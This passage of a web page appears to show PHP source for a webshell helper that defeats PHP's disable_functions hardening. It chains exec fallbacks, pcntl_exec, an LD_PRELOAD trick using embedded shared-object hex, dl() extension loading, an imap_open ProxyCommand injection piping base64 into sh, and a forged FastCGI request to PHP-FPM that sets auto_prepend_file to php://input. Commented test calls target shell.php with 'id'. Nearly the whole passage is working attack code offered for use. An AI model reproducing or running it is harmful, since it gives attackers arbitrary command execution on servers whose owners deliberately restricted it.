class="line"><span class="template-variable"><span class="language-handlebars">function send_cmd_to_file(<span class="name">$cmd</span>, $file = <span class="string">'cmd'</span>, $result = <span class="string">'result'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $outfile = WRITE_DIR . $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmdfile = WRITE_DIR . $file;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = trans_cmd(<span class="name">$cmd</span>, $outfile);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    write_file(<span class="name">$cmdfile</span>, $cmd);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        <span class="name">$cmdfile</span>,</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $outfile</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    );</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function send_cmd(<span class="name">$cmd</span>, $result = <span class="string">'result'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $outfile = WRITE_DIR . $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = trans_cmd(<span class="name">$cmd</span>, $outfile);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        <span class="name">$cmd</span>,</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $outfile</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    );</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function recv_result(<span class="name">$result</span> = <span class="string">'result'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $ret = read_file(<span class="name">$result</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    @unlink(<span class="name">$result</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $ret;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function send_socket(<span class="name">$data</span>, $host, <span class="attr">$port</span>=<span class="number">9000</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if ( <span class="name">function_exists</span>(<span class="name">'stream_socket_client'</span>) ) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">strpos</span>(<span class="name">$host</span>,<span class="string">'unix://'</span>) !== <span class="literal">false</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $client = $host;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $client = <span class="string">'tcp://'</span> . $host . <span class="string">':'</span> . $port;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $fp = stream_socket_client(<span class="name">$client</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'fsockopen'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $fp = fsockopen(<span class="name">$host</span>, $port, $errno, $errstr, <span class="number">30</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">$fp</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        fwrite(<span class="name">$fp</span>, $data);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        while (!<span class="name">feof</span>(<span class="name">$fp</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $content .= fgets(<span class="name">$fp</span>, <span class="number">4096</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        fclose(<span class="name">$fp</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return $content;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第一种: 常规绕过, 寻找漏掉的命令执行函数, 适用于winodws + linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * exec、shell_exec、system、passthru、popen、proc_open</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function common_exec_cmd(<span class="name">$cmd</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $res = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'exec'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @exec(<span class="name">$cmd</span>, $res);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = join(<span class="name">"\n"</span>, $res);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'shell_exec'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = @shell_exec(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'system'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_start();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @system(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = @ob_get_contents();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_end_clean();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'passthru'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_start();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @passthru(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = @ob_get_contents();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_end_clean();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (@<span class="name">is_resource</span>(<span class="name">$f</span> = @popen(<span class="name">$cmd</span>, <span class="string">"r"</span>))) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        while (!@<span class="name">feof</span>(<span class="name">$f</span>)) {$res .= @fread(<span class="name">$f</span>, <span class="number">1024</span>);}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @pclose(<span class="name">$f</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'proc_open'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $descriptorspec = array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            <span class="name">0</span> =&gt; array(<span class="name">"pipe"</span>, <span class="string">"r"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            <span class="number">1</span> =&gt; array(<span class="name">"pipe"</span>, <span class="string">"w"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            <span class="number">2</span> =&gt; array(<span class="name">"pipe"</span>, <span class="string">"w"</span>)</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        );</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $process = proc_open(<span class="name">$cmd</span>, $descriptorspec, $pipes, <span class="literal">null</span>, <span class="literal">null</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">is_resource</span>(<span class="name">$process</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            fwrite(<span class="name">$pipes</span>[0], <span class="string">'$stdin'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            fclose(<span class="name">$pipes</span>[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $res = stream_get_contents(<span class="name">$pipes</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $res;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第二种: pcntl_exec绕过</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function pcntl_exec_cmd(<span class="name">$cmd</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'pcntl_exec'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd_arr = send_cmd_to_file(<span class="name">$cmd</span>, <span class="string">'cmd.sh'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        pcntl_exec(<span class="name">"/bin/bash"</span>, array(<span class="name">$cmd_arr</span>[0]));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo pcntl_exec_cmd(<span class="name">"id"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第三种: ld_preload绕过: 仅限Linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * mail、imap_mail、error_log、mb_send_mail</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * From: https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function ld_preload_exec_cmd(<span class="name">$cmd</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $so_file = WRITE_DIR . <span class="string">'system.so'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">ARCH</span> === <span class="number">64</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['system_so_x64']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['system_so_x32']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd_arr = send_cmd(<span class="name">$cmd</span>, <span class="string">'result'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    putenv(<span class="name">"EVIL_CMDLINE="</span> . $cmd_arr[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    putenv(<span class="name">"LD_PRELOAD="</span> . $so_file);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'error_log'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        error_log(<span class="name">""</span>, <span class="number">1</span>, <span class="string">"example@example.com"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'mail'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        mail(<span class="name">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'mb_send_mail'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        mb_send_mail(<span class="name">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif ((<span class="name">function_exists</span>(<span class="name">'imap_mail'</span>))){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        imap_mail(<span class="name">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @unlink(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    // del so file</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    @unlink(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo ld_preload_exec_cmd(<span class="name">$_GET</span>['cmd']);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//$so_file = WRITE_DIR . <span class="string">'system_x32.so'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//var_dump(<span class="name">bin2hex</span>(<span class="name">read_file</span>(<span class="name">$so_file</span>)));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第四种: ld加载php扩展:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * ld</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * https://github.com/Medicean/as_bypass_php_disable_functions</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * https://github.com/AntSwordProject/ant_php_extension</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function dl_exec(<span class="name">$cmd</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">function_exists</span>(<span class="name">'dl'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $so_file = WRITE_DIR . <span class="string">'php.so'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">ARCH</span> === <span class="number">64</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['php_so_x64']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['php_so_x32']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $so_file = <span class="string">"ant_x64.so"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        dl(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $result = antsystem(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        // del so file</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @unlink(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo dl_exec(<span class="name">"id"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第五种: imap_open: 仅限Linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function imap_open_exec(<span class="name">$cmd</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'imap_open'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd_arr = send_cmd(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $server = <span class="string">"x -oProxyCommand=echo\t"</span> . base64_encode(<span class="name">$cmd_arr</span>[0]) . <span class="string">"|base64\t-d|sh}"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        imap_open(<span class="name">'{'</span> . $server . <span class="string">':143/imap}INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * FastCgi:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * <span class="number">9000</span> port</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * phpx.x-fpm.sock</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * Fail: windows</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function p(<span class="name">$ptr</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return bin2hex(<span class="name">chr</span>(<span class="name">$ptr</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function pnv(<span class="name">$len</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">$len</span> &lt; <span class="number">128</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return p(<span class="name">$len</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return p((<span class="name">$len</span> &gt;&gt; <span class="number">24</span>) |<span class="number">0</span>x80) . p((<span class="name">$len</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0</span>xFF) . p((<span class="name">$len</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0</span>xFF) . p(<span class="name">$len</span> &amp; <span class="number">0</span>xFF);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">// 还需要更改具体的fastcgi参数, 目前能在linux下使用</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//$host = <span class="string">'unix:///run/php/php7.3-fpm.sock'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function fastcgi_exec(<span class="name">$cmd</span>, $file, $host, <span class="attr">$port</span>=<span class="number">9000</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">strlen</span>(<span class="name">$cmd</span>) &gt; <span class="number">40</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        echo <span class="string">"Bug: command len need &lt; 40, will be fix."</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = base64_encode(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $php_code = <span class="string">'&lt;?php system(base64_decode("'</span>.$cmd.'"));exit();?&gt;';</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $php_code_len = strlen(<span class="name">$php_code</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $php_code_pad = p((<span class="name">$php_code_len</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0</span>xFF) . p(<span class="name">$php_code_len</span> &amp; <span class="number">0</span>xFF) . p(<span class="name">0</span>) . p(<span class="name">0</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    //$uri = bin2hex(<span class="name">__FILE__</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    //$uri = <span class="string">'/var/www/html/shell.php'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $uri = $file;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $uri_val_pad = pnv(<span class="name">strlen</span>(<span class="name">$uri</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $params = <span class="string">'0e02434f4e54454e545f4c454e475448'</span>.bin2hex(<span class="name">$php_code_len</span>).'0c10434f4e54454e545f545950456170706c69636174696f6e2f746578740b0452454d4f54455f504f5254393938350b095345525645525f4e414d456c6f63616c686f7374110b474154455741595f494e54455246414345466173744347492f312e300f0e5345525645525f534f4654574152457068702f66636769636c69656e740b0952454d4f54455f414444523132372e302e302e310f'.$uri_val_pad.'5343524950545f46494c454e414d45'.bin2hex(<span class="name">$uri</span>).'0b'.$uri_val_pad.'5343524950545f4e414d45'.bin2hex(<span class="name">$uri</span>).'091f5048505f56414c55456175746f5f70726570656e645f66696c65203d207068703a2f2f696e7075740e04524551554553545f4d4554484f44504f53540b025345525645525f504f525438300f085345525645525f50524f544f434f4c485454502f312e310c0051554552595f535452494e470f165048505f41444d494e5f56414c5545616c6c6f775f75726c5f696e636c756465203d204f6e0d01444f43554d454e545f524f4f542f0b095345525645525f414444523132372e302e302e310b'.$uri_val_pad.'524551554553545f555249'.bin2hex(<span class="name">$uri</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $params_len = strlen(<span class="name">hex2bin</span>(<span class="name">$params</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $params_pad = p((<span class="name">$params_len</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0</span>xFF) . p(<span class="name">$params_len</span> &amp; <span class="number">0</span>xFF) . p(<span class="name">0</span>) . p(<span class="name">0</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $fastcgi_data = <span class="string">'01017b0700080000000100000000000001047b07'</span>.$params_pad.$params.'01047b070000000001057b07'.$php_code_pad.bin2hex(<span class="name">$php_code</span>).'01057b0700000000';</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $result = send_socket(<span class="name">hex2bin</span>(<span class="name">$fastcgi_data</span>), $host, $port);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    if(<span class="name">$result</span> != FAILURE){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $start = md5(<span class="name">"s"</span>);;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $end = md5(<span class="name">"e"</span>);;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $input = $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $result = substr(<span class="name">$<span class="built_in">input</span></span>, strlen(<span class="name">$start</span>)+strpos(<span class="name">$<span class="built_in">input</span></span>, $start),(<span class="name">strlen</span>(<span class="name">$<span class="built_in">input</span></span>) - strpos(<span class="name">$<span class="built_in">input</span></span>, $end))*(<span class="name">-1</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//var_dump(<span class="name">fastcgi_exec</span>(<span class="name">"id"</span>,<span class="string">'/var/www/html/shell.php'</span> , <span class="string">'127.0.0.1'</span>, <span class="number">9002</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo fastcgi_exec(<span class="name">"id"</span>,<span class="string">'/var/www/html/ant.php'</span> , <span class="string">'unix:///run/php/php7.3-fpm.sock'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//var_dump(<span class="name">fastcgi_exec</span>(<span class="name">"whoami"</span>,<span class="string">'C:\\phpstudy2018\\PHPTutorial\\WWW\test\\apache\\1.php'</span> , <span class="string">'127.0.0.1'</span>, <span class="number">9000</span>));</span></span></span><br><span class="line"><span 